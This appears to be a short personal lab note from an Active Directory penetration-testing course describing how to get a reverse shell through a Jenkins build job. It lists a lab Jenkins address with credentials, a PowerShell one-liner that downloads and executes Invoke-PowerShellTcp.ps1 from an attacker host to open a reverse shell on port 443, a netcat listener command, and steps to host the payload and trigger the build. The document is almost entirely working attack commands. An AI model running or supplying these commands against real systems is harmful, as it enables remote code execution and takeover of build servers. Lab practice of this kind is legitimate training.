reversehell for jenkins build:
in this lab, jenkins ip: http://172.16.3.11:8080
builduser:builduser
```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
```

start listner on powershell 
```
cd C:\AD\Tools
```
```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

host reverse shell on hfs.
press build.
